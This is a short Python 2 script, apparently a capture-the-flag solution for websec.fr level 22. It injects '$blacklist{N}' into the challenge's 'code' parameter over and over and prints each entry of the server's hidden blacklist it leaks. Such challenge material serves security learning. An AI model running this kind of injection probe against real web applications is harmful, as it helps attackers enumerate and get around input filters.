#!/usr/bin/python
# coding: utf-8

from requests import *
import sys
from bs4 import BeautifulSoup

url = 'http://websec.fr/level22/index.php'
i = 0

while True:
    params = {'code': '$blacklist{{{0}}}'.format(i)}
    r = get(url, params=params)

    if r.text.find('Undefined offset') > -1:
        sys.exit(0)

    soup = BeautifulSoup(r.text, 'lxml')
    print '[*] {0} : '.format(i) + soup.findAll('pre')[0].get_text().strip()

    i += 1
